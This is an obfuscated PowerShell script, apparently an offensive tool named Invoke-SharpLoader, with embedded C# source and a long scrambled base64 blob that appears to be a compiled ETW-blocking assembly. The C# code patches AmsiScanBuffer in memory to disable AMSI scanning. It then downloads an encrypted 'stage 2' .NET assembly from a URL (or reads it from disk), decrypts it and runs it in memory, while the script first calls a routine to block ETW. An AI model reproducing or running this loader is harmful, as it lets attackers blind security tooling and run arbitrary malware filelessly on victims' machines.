 ${E`PI}=[tyPE]("{4}{2}{0}{3}{1}{5}" -f'o','R.','HaRpl','ADe','S','PROgrAM')  ;   &('sv') ("{1}{0}" -f 'Eu','ng') ([TYPE]("{3}{6}{4}{2}{0}{5}{1}"-F 'EfleCtIOn.AS','MBly','R','Sy','tEM.','se','S') )  ; &("{2}{0}{1}" -f'IT','Em','seT-') ("{1}{2}{0}" -f 'Km','V','AriAble:21')  (  [type]("{1}{0}" -f'NVert','CO'))  ;  &("{2}{0}{1}"-f 'ET-','vArIaBLE','S') ("{0}{1}"-f'RP','B1G')  ([tYpe]("{2}{5}{1}{0}{4}{3}"-F 'HOoketW.H','nT.','AG','k','oO','e')  ) ; function inVoK`e-S`ha`RpLoADER
{


Param
    (
        [Parameter(manDatORY=${t`RUE})]
        [string]
        ${b`J},
        [Parameter(manDAtOrY=${T`RUe})]
	    [string]
        ${dm`FcxXN},
        [string]
        ${2`BY`FUv6T},
        [string]
        ${nok`qY`Xp8},
        [string]
        ${mN`6zXJi7M`TQgf4vZPf`Esw8},
        [Switch]
        ${X`A01Ub}
	)
&("{0}{1}{2}{3}"-f("{0}{1}" -f'In','vo'),'k',("{1}{0}"-f'ck','e-Blo'),'ETW')

${oT7pht`3ankCM`I4`Ae} = @"
using System;
using System.Net;
using System.Text;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace SharpLoader
{
    public class gofor4msi
    {
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        public static void now()
        {
            if (is64Bit())
                gofor(x64);
            else
                gofor(x86);
        }

        private static void gofor(byte[] patch)
        {
            try
            {
                var a = "am";
                var si = "si";
                var dll = ".dll";
                var lib = Win32.LoadLibrary(a+si+dll);
                var Am = "Am";
                var siScan = "siScan";
                var Buffer = "Buffer";
                var addr = Win32.GetProcAddress(lib, Am+siScan+Buffer);

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
        class Win32
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);

            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
    }
    public class Program
    {
        public static void PrintBanner()
        {
            Console.WriteLine(@"                        f                ");
            Console.WriteLine();
        }
        public static string Get_Stage2(string url)
        {
            try
            {
                HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
                IWebProxy webProxy = myWebRequest.Proxy;
                if (webProxy != null)
                {
                    webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    myWebRequest.Proxy = webProxy;
                }
                HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
                Stream data = response.GetResponseStream();
                string html = String.Empty;
                using (StreamReader sr = new StreamReader(data))
                {
                    html = sr.ReadToEnd();
                }
                return html;
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine();
                Console.WriteLine("\n[!] Whoops, there was a issue with the url...");
                Console.ResetColor();
                return null;
            }
        }
        public static string Get_Stage2disk(string filepath)
        {
            string folderPathToBinary = filepath;
            string base64 = System.IO.File.ReadAllText(folderPathToBinary);
            return base64;
        }
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    try
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;
                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);
                        AES.Mode = CipherMode.CBC;
                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
                        Console.ResetColor();
                    }
                }
            }
            return decryptedBytes;
        }
        public byte[] GetRandomBytes()
        {
            int _saltSize = 4;
            byte[] ba = new byte[_saltSize];
            RNGCryptoServiceProvider.Create().GetBytes(ba);
            return ba;
        }
        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[32768];
                int read;
                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }
                return resultStream.ToArray();
            }
        }
        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }
        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        password = password.Substring(0, password.Length - 1);
                        int pos = Console.CursorLeft;
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        Console.Write(" ");
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            Console.WriteLine();
            return password;
        }
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            gofor4msi.now();
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
        }
        public static void Main(params string[] args)
        {
            PrintBanner();
            if (args.Length != 2)
            {
                Console.WriteLine("Parameters missing");
            }
            string location = args[0];
            string ishttp = "http";
            string Stage2;
            if (location.StartsWith(ishttp))
            {
                Console.Write("[*] One moment while getting our file from URL.... ");
                Stage2 = Get_Stage2(location);
            }
            else
            {
                Console.WriteLine("NO URL, loading from disk.");
                Console.Write("[*] One moment while getting our file from disk.... ");
                Stage2 = Get_Stage2disk(location);
            }
            Console.WriteLine("-> Done");
            Console.WriteLine();
            Console.Write("[*] Decrypting file in memory... > ");
            string Password = args[1];
            Console.WriteLine();
            byte[] decoded = Base64_Decode(Stage2);
            byte[] decompressed = Decompress(decoded);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);
            int _saltSize = 4;
            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
            {
                originalBytes[i - _saltSize] = bytesDecrypted[i];
            }
            object[] cmd = args.Skip(2).ToArray();
            loadAssembly(originalBytes, cmd);
        }
    }
}
"@

&("{0}{1}{2}" -f'Ad','d-',("{0}{1}"-f 'Typ','e')) -TypeDefinition ${ot7pH`T`3AnKC`Mi4`Ae}

if (${xA0`1Ub})
{
      (&("{1}{0}{2}" -f'B','vARIA','LE')  ("EP"+"i")  )."VA`lue"::("{1}{0}" -f'n','Mai').Invoke("$bJ","$DmFCXxN")
}
elseif (${mn6`ZXjI7mtqGf`4v`ZP`Fe`s`W8})
{
     ${e`PI}::("{0}{1}"-f 'M','ain').Invoke("$bJ","$DmFCXxN","$2BYfuv6T","$noKqyxP8", "$MN6Zxji7mtqgF4vzpfEsw8")
}
elseif (${n`OKqyx`p8})
{
     ${e`pI}::("{1}{0}"-f 'ain','M').Invoke("$bJ","$DmFCXxN","$2BYfuv6T","$noKqyxP8")
}
elseif (${2by`FuV`6T})
{
     (  &("{1}{0}{2}" -f 'Et','G','-ItEm')  ('VA'+'RiaBLe'+':e'+'pi') )."VAl`UE"::("{1}{0}" -f'in','Ma').Invoke("$bJ","$DmFCXxN","$2BYfuv6T")
}

}


function I`NVOke-Bloc`K`EtW
{
    ${a`Rsj`Ul}=("{124}{285}{305}{76}{300}{96}{134}{299}{167}{240}{288}{68}{118}{132}{22}{75}{236}{181}{210}{217}{14}{254}{6}{296}{209}{143}{32}{195}{207}{218}{275}{155}{120}{224}{16}{290}{116}{226}{242}{113}{295}{142}{105}{266}{98}{136}{204}{67}{284}{55}{102}{297}{139}{173}{171}{51}{73}{170}{58}{163}{276}{175}{308}{103}{121}{263}{219}{122}{138}{114}{234}{159}{260}{94}{125}{303}{45}{231}{216}{37}{294}{128}{269}{101}{71}{214}{289}{251}{282}{79}{66}{191}{2}{24}{84}{95}{112}{89}{256}{272}{145}{117}{152}{83}{97}{252}{158}{47}{189}{190}{65}{243}{62}{283}{221}{202}{212}{81}{34}{239}{238}{186}{198}{110}{93}{278}{5}{41}{52}{311}{187}{33}{199}{43}{87}{197}{109}{123}{270}{280}{78}{106}{20}{107}{0}{179}{17}{54}{48}{265}{176}{13}{64}{57}{307}{160}{178}{244}{232}{166}{146}{31}{246}{19}{237}{30}{149}{233}{56}{301}{12}{309}{157}{26}{192}{293}{292}{60}{223}{9}{3}{250}{88}{168}{91}{205}{90}{126}{141}{28}{161}{257}{188}{298}{230}{29}{92}{174}{147}{206}{274}{306}{10}{255}{229}{287}{130}{245}{70}{164}{23}{38}{200}{137}{99}{7}{196}{82}{313}{261}{151}{108}{135}{262}{304}{247}{183}{194}{46}{50}{21}{165}{11}{184}{129}{193}{131}{279}{144}{104}{203}{277}{201}{140}{127}{185}{259}{40}{119}{225}{72}{162}{215}{227}{63}{111}{248}{273}{74}{228}{77}{100}{86}{241}{235}{85}{182}{208}{271}{4}{268}{281}{291}{267}{156}{61}{314}{8}{133}{80}{36}{44}{211}{258}{310}{27}{59}{1}{49}{220}{253}{115}{15}{302}{172}{154}{286}{213}{177}{25}{169}{148}{39}{42}{18}{53}{222}{69}{249}{35}{153}{180}{150}{312}{264}"-f 'sbABOdGRsbABTeXN0ZW0ARW51bQBscE51bWJlck9mQnl0ZXNXcml0','zIj4NCiAgICAgICAgPHJlcXVlc3RlZEV4','AegQBAA','3AGJsb2NrZXR3AEFnZW50Lmhvb2tldHcAVmlydHV','ABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAQgANAAEATwByAGkAZwBpAG','bGxBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBGbGFnc0F0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0','AFgPAAAjU3RyaW5n','AQAAAAAAAAAAAAAAAAAAAAUlNEUy9c631mrQdIt','AuMC4wI','V0cHV0AFN5c3RlbS5UZXh0AHdTaG93V2luZG9','C','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','aE9iamVjdABXaW4','5tYXBWaWV3T2','qKBIAAAofQBIDKBQAAAYmBggHB45pEgQoEwAABiYGCAeOaWooEgAACgkSBSgUAAAGJioeAigTAAAKKh4CKBMAAAoqHgIoEwAACioeAigTAAAKKh4CKBMAAAoqAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAb','QogIDwvdHJ1c3RJbmZv','KBgD4BsUIBgB7CsUIAAAAAFgAAAAAAAEAAQABABAAeAiO','24AU2V0SGFuZGxlSW5mb3JtYXRpb2','AAAAAAAAAAAAAAAA','SW5mb3JtYXRpb25DbGFzcwBkd0Rlc2lyZWRBY2Nlc3MAZGVzaXJlZEFjY2VzcwBw','XJuTGVuZ3RoAHJldHVybkxlbmd0aABsZW5ndGgAaG9vawBkd01hc2sAQWZmaW5pdHlNYX','AA','AAA','MS4wLjAuMAAASQEAGi5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC41AQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRIuTkVUIEZyYW1','ABLQDrAgEAAAEvAKoMAgAAATEA6g4CAAABNQB+DAMAAAE3','AAAAAAAAAAAAAAAAAAAAAAAAAA','QAZmxQcm90ZWN0AEFsbG9jYXRpb25','bGVnZXMgeG1sbnM9I','CQgAAwIYEUQRRAgABAIYCAgQGAoABwIYCRgYGBg','BgY','ycmVudFB','wQXR0cnMAVGhyZWFkSW5mb3JtYXRpb25DbGFzcw','AAAAAAAACAAABVz0CFAkCAAAA+gEzABYAAAEAAAAXAAAAEwAAAFcAAAApAAAAnAAAABMAAAAeAAAAEgAAAAUAAAABAAAAAwAAACMAAAABAAAAAgAAABAA','AQnl0ZQBscFZhbHVlAGxwUHJldm','luZG93VGl0bGUAaE1vZHVsZQBwcm9jTmFtZQBNb2ROYW1lAFF1ZXJ5RnVsbFByb2Nlc3NJbWFnZU5hbWUAbHBFeGV','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','K','AC8MAAADAOkLAAAEAIkHAAAFAP8NAAAGAIMKAAAHAEcEAAABANwDAAACAAYEAAADAPAMAAAEACoNAAAFAGwHAAAGAJ8NAAAHAIAHAAAIAN0JAAAJAC4FAAAKAFoNAAABAP4HACACALcHAAABABAIAAACAJUKAAADAKwEAAAEANIDAAABAP4HAAACALcHAAADAPYHAAABAGEEAAACAHI','ld29yayA0Lj','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','gAAAcAwAAAAAAAAAAAAAcAzQA','ZQBBc3','AAAAAAAAAAAAAAAAAAAAA','GFja','ICA8dHJ1c3RJbmZvIHhtbG5zPSJ1c','AEAFMHAgAFANEIAAABAGcMAAACAAwNAAADAHkHAAAEAJINAgAFAGcNAQABAGcMAQACAJILAgADAJQEAAAEAHcHAAABABIDAAABA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','21VbmlxdWVQcm9jZXNzSWQAZHdQcm9jZXNzSWQAcHJvY2Vzc0lkAENsaWVudEl','HVhbE1lbW9yeU9wZXJhd','ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxz','AAAAAA','CTIEsM/QAfAAAAAACAAJMgdwETASoAAAAAAIAAkyD+BBcBKgA','NlbWJseUNvcHlyaWdod','AAAAAAAAAAAA','4AbHBQcm9jZXNzSW5mb3JtYXRpb24AcHJvY2Vzc0luZm9ybWF0aW9uAFNldEluZm9ybWF0aW9uAFF1ZXJ5SW5mb3JtYXRpb24AVmlyd','BWgEsM','QZWJCYXNlQWRkcmVzcwBUZWJCYXNlQWRkcmVzcwBscEJhc2VBZGRyZXNzAEZ1bmN0aW9uQWRkcmVzcwBscEFkZHJlc3MAbHBTdGFydEFkZH','W1ldGVyAGhTdGRFcnJvcgAuY3RvcgBscFNlY3VyaXR5RGVzY3JpcHRvcgBVSW50UHRyAGFsbG9jYXRpb25BdHRyaWJzAERsbENoYXJhY3RlcmlzdGljcwBTeXN0ZW0uRGlhZ25vc','CwAygBMwAAAAAAgACTIPYOLQE0AAAAAACAAJMgBA8zATYAAAAAAIAAkyCcDj0BOwA','nVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnY','1RocmVhZEF0dHJpYnV0ZUxpc','mx5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0K','XVhbGl0eU9m','WAIAAAEAMAAwADAAMAAwADQAYgAwAA','ZTZWN0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAHNlY3Rpb24ASW5oZXJpdERpc3Bvc2l0aW9uAFNoZWxsSW5mbwBEZXNrdG9wSW5mbwBscFN0YXJ0dXBJbmZvAGxwRGVza3RvcABTdHJpbmdCdWlsZGVyAGxwQnVmZmVyAGxwQnl0ZXNCdWZmZXIAYnVmZmVyAGxwUGFyY','lSZWFkAE50UXVldWVBcG','LgBbAFMCLgBjAHECLgBrAJsCLgBzAKgCAwJ7AEAAIwJ7AEAAQwJ7AEAAYwJ7AEAALwCGADYAhgA7AIYAPwCGAPEAiAAaAKgIFwC1CAABCQAMBQEAQAELABcJAQBAAQ0AJg4BAEABDwBaBQEAQAERAHIMAQBAARMAvAMBAAABFQBLDAEARgEXAHcBAQBAARkA/gQBAEABGwA+DQEAQAEdAAgOAQBAAR8AsAMBAAABIQD2DgEAAAEjAAQPAQAAASUAnA4BAEABJwAWDwEAAAEpANkOAQ','QJqgBW','AGCIAAAAgAAAAJAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAKwFAAAAYAAAAAYAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','yLWFkYzQtNDI1','ABAAYEAAACAPAMCQBgCgEAEQBgCgYAGQBgCgoAKQBgChAAMQBgChAAOQBgChAAQQBgChAASQBgChAAUQBgChAAWQBgChAAYQBgChUAaQBgChAAcQBgChAAeQBgChAAmQBgCgYAqQCYDCQAqQCKAykAuQCtDS0AgQBgCgYACQDcADsACQDgAEAAC','AAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAb','AAAAAgACTID4NIgEwAAAAA','ADoACQABAEYAaQBsAGUARABlAHMAY','AAAAAAAAAAAAAAAAAAAAAAAAAABMwBQBn','ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAItqxqAAAAAAAAAAAOAAIgALATAAACQAA','AAAABiAGwAbwBj','AERsbFBhdGgATWF4aW11bUxlbmd0aABUaHJlYWRJbmZ','FMCLgAzAFMCLgA7AFMCLgBDAEUCLgBLAFkCLgBTAFMC','cCIvPg0','lAGhUYXJnZXRQcm9jZXNzSGFuZGxlAHByb2Nlc3NIYW5kbGUAbHBUYXJnZXRIYW5kbGUAYkluaGVyaXRIYW5kbGUAaGFuZGxlAGhGaWxlAGxwVGl0bGUAV2','hc3RlclxCbG9ja0V0dy1tYXN0ZX','RFQ1RfRlJPTV9DTE9TRQBQQUdFX1JFQURXUklURQBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFAFBBR0VfRV','ALwOAwAAATkAcAwDAAABOwCLCQMAAAE','UAdAB3AC4AZQB4AGUAAAAAAEgAEgABAEwAZQBnAG','AAAAAAMQAuADAALgAwAC4AMAAAADoADQABAEkAbgB0AGUAcgBuAGEAbABOAGEAb','1Jlc2VydmUAYmxvY2tldHcuZXhlAGR3WFNpemUAZHdZU2l6ZQBjYlNpemUAbHBSZXR1cm5TaXplAGx','ldGVyc0V4AFZp','DAADAA0AAwAOAAMADwADABAAAwAR','XR5AAAAE24AdABkAGwAbAAuAGQAbABsAAAbRQB0AHcARQB2AGUAbgB0AFcAcgBpAHQAZQAAAAAADkZ4MR7Rjkm1zVKu86xh4QAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECCQcGGB0FGAkYCQQAABJVAyAAGAQAARkLCLd6XFYZNOCJBP8PHwA','RGlyZWN0b3J5AFJvb3REaXJlY3RvcnkAQ','GBgYGAkMAAQJEBgJEBE4EBE8DAAHCRAYCRgQCgkJGBAACgkYGBAYGBgQChAKCQkJBwACARARMA4KAAQJGBgQETAQGAoAAwkQETQQETA','hcmdldEZyY','CAAABAGcMAAACAA','9AJsJAwAAAT8AxAcDAAABQQDMAwMAAAFDANkHAwAAAUUAuQwDAAABRwCrDgMAAAFJANMCAwAAAUsA5AIDAAABTQAaAwMAAAFPAK4JAwAEgAAAAQAAAAAAAAAAAAAAAACF','gAAAAYAAAAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACgAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAE','hFQ1VURQBVTklDT0RFX1NUUklORwBBTlNJX1NUUklORwBUSFJFQURfQkFTSUNfSU5GT1JNQVRJT04AUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTgBQUk9DRVNTX0lORk9STUFUSU9OAFNUQVJUVVBJTkZPAEdldENvbnNvbGVPdXRwdXRDUABPQkpFQ1RfQVRUUklCVVRFUwBTRUNVUklUWV9BVFRSSUJVVEVTAEhBTkRMRV9GTEFHUwBQQUdFX05PQUNDRVNTAERVUExJQ0FURV9TQU1FX0FDQ0VTUwBJTkhFUklUAFNUQVJUVVBJTkZPRVgAZHdYAFBBR0VfUkVBRE9OTFkAUEFHRV9XUklURUNPUFkAUEFHRV9FWEVDVVRFX1dSSVRFQ09QWQBkd1kAdmFsdWVfXwBSdW50aW1lRGF0YQBTZXRRdW90YQBjYgBtc2NvcmxpYgB','ADABQKkAADAE0','jAAAAAAAAAAAAAAAAAA','AGsAZQB0AHcAAAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8Abg','AFAEsAAAABAJUDAAACANkNAAABAJUDAAACAPALAAADAO0IAAAEACYIAAAFAFcIAA','qgBWgEcCqgBWgFQJqgBWgGMJqg','fQAAAAAAgACTILkM2QGAAAAAAACAAJMgqw7','AAAAAAAAAA','AUBAACfC','vcm1hdGlvbkxlbmd0aABwcm9jZXNzSW5mb3JtYXRpb25MZW5ndGgAUmV0d','NrAE9yZGluYWwAYnl0ZXNBdmFpbABBbGwAa2VybmVsMzIuZGxsAG50ZGxsLmR','QAAAAAAAAAAAAAAAF9Db','U2l6ZQBDb21taXRTaXplAGxwZHdTaXplAFZpZXdTaXplAE1heFNpemUAU3luY2hyb25pemUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBTb3VyY2VTdHJpbmcAUnRsSW5pdFVuaWNv','idXRlAFR','AAGgABAAEAQwBvA','DgAABAAAAAAAAAAAAAAAMgBTAgAAAAAEAAAAAAAAAAAAAAAyAMUIAAAAAAQAAwAFAAMABgADAAcAAwAIAAMACQADAAoAAwALAAMA','AJAEAAEEAIgApAA0BEAAJAQAASQAoACoADQEQABgBAABJACsAKgANAR','AACANYEAAADAEoLAA','vc2VjdXJpdHk+D','wDQQABAAMABQAQAA4AAABBAAEABA','RV9HVUFSR','AAmAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAALAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADzQQAAAAAAAEgAAAACAAUA7CAAACggAAADAAIAAQAABgAAAAAAAAAAAA','AABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEY','gDcBZ0HBgBTDcUIBgAeCm0OBgAiBcUI','kAYQAAAAAAIAAkyDTAvQBjwAAAAAAgACTIOQC/QGUAAAAAACAAJMgGgMEApYAAAAAAIAAl','DAJILAAABAEgOAAACAO4NAAADAJILAAAEAF','ZGVTdHJpbmcAUnRsVW5pY29kZVN0cmlu','TVqQAAMAAAAEAAAA//8AALgAAAAAAA','wNAAADAHkHAAAEA','EAQAAAAQCAAAABAgAAAAEEAAAAAQgAAAABEAAAAAEgAAAAAQAAQAABAACAAAEAAQAAAQAEAAABAAAEAAEAAAAAAQEAAA','CAAAIAYAAAAUAAA','UHAAALADUKAAABAJUDAAACAOQEAAADAAEAAAAEAD4','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAXAQAS','AAAAAA','AAAAAAAAAAAAAAAAAAAAAA','iBuYW1lPSJNeUFwcGxpY2F0aW9uLmFw','AAAEAAAA','3JFeGVNYWluAG1zY29yZWUuZGxsAAAAAAAA/yUAIEAAAAAAA','EkAADAPcBjQADAC8CjQADADUHjQADAD0HjQADALoLjQADAMgLjQADAPUFjQADAJILjQADAHkOkwADACYAkwADADIAigADAFgOigADAGIOigADAFYKigADAAgKlgADAEgOigADAGkIjQADAGYKigADEDEEmgADADMNigADANAMigADAIQIigADAEoPigADAHQCnQADAGcCigADADMNoAADAN8MigADAJoCowADAIQInQADAE4PjQADAEoPjQADAGoIpwADABgIpwADADwKigADAGoIpwADABgIpwADADwKigADAGoIjQADADwPigADAMYEigADAGQLoAADAGgKigADAE4DigADAFkMigADAAUDigAGBjMCoABWgKQIqgBW','AAAIAAABzAAAATEEAAEw','kHAAABAEgOAAACAJILAAADAO4GAAAEAP0GAAAFAEUHAAAGAAUHAAAHAEwHAAABAD0MAAACADEEAAADAJACACAAAAAAAAABAOoDAAACAKIDAAADAP8DAAAEACIEAAAFAB8MACAGADEEAAAHALALACAAAAAAAAABALQEA','gJEHqgAGBjMCoABWgO8ErgBWgOEBrgBWgMMArgAGBjMCoABWgIgAsgBWgMsBsgAGBjMCoABWgL4AtgBWgPwAtgBWgGEAtgBWgOUAtgBWgBgCtgBWgL0BtgBWgPsBtgBWgNYAtgBWgAkCtgBWgH0AtgBWgJ8AtgBWgKwAtgBQIAAAAACWAOgIugABAMMgAAAAAIYYYAoGAAIAyyAAAA','AAAAAIAEAAAA','AAQIBFQIGGAIGCAIGDgIGBgMGERwCBgICBhkCBgkDBhE8AgYHAwYRQAMGEUQDBhFIAwYRTAUAAQEdDgsABAIQGBAYEBEk','ABRADYAKgAFAQAAsAEAAFEARAAqA','ACNHVUlEAAAANB0AAPQCAAAjQmxvYgA','AA','SZXNlcnZlZDIAbHBSZXNlcnZlZDIAQXBjQXJndW1lbnQyAEFwY0FyZ3VtZW50MwA8TW9kdWxlPgBQQUdFX0VYRUNVVEVfUkVBRABDTElFTlRfSUQAUEFH','DaGFycwBkd1lDb3VudENoYXJzAHBQcm9jZXNzUGFyYW1ldGVycwB','JEBgJGBgYGAIJCQkYCAAFCRgYGBgYBgACCRgQCQ','AAAAAAAAAAAAAAAA','yb2Nlc3MAR2V0UHJvY0FkZHJlc3MATGRyR2V0UHJvY2VkdXJlQ','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAFCAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADzQ','ABEVVBMSUNBVEVfQ0xPU0VfU09VUkNFAFBBR0VfTk9DQUNIRQBQQUdFX1dSSVRFQ09NQklORQBOT05FAFBST1','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','MJB','lAHQAdwAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAvGMAAOoBAAAAAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCg0KPGFzc2VtY','3','VyaXRlZEZyb','KACwJAAABAEAEAAACAEMKAAADAGAHAAAEALcCAAAFAJkIAAAGAGcDAAABAEAEAAACALsKAAABAEgOAAABAFINAAABAC0KAAACAHEIAAABAG','bGlzZWNvbmRzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGJJbmhlcml0SGFuZGxlcwBscFRocmVhZE','YBwADGBFAAggLAAcCGBgY','gBzAGwAYQB0AGkAb','AAAAAgACTIBYPRgFAAAAAAACAAJMg2Q5RAUUAAAAAAIAAkyB6BFsBSgAAAAAAgACTIOsCZQFOAAAAAACAAJYgqgxqAU8AAAAAAIAAliDqDnABUQDTIAAAAACGGGAKBgBSAAAAAACAAJMgfgx1AVIAAAAAAIAAkyC8DoABVwAAAAAAgACTIHAMkAFiAAAA','ZGQ1Zjg1YmNhAAAMAQAH','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','NGbGFncwBkd0ZsYWdzAGFyZ3MARHVwbGljYXRlT3B0aW9ucwBkd09wdGlvbnMAZHdYQ291bnR','wFAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwA','cnR1YWxQcm90ZWN0RXgATG9hZExpYnJhcnkAUnRsWmVyb01lbW9yeQBSZWFkUHJvY2Vzc01lbW9yeQBXcml0ZVByb2Nlc3NNZW1vcnkAbHBDdXJyZW50','AAAAAAAAAAAAAAAAAAAAAAAA','ACAAJMgCA4oATIAAAAAAIAAky','MgFwnMAAYAAAAAAIAAkyAmDtUAC